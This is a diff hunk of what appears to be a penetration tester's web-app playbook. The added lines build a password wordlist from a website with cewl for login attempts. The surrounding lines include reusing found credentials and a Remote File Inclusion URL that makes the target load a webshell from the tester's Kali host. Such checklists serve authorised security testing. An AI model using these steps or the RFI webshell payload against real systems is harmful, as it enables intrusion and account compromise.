@@ -18,3 +18,5 @@ Web App Playbook
 * Try creds found in other enumeration (services on other ports, etc., if available)
 * Does the page use php?  Try basic RFI: `http://example.com/index.php?page=http://<kali ip>/<webshell.php>`
    * (use index.php, or if you find a different php file, use that)
+* Cewl wordlist of the website and try logging in:
+   * `cewl <http://website.com> -m 4 -w wordlist.txt`
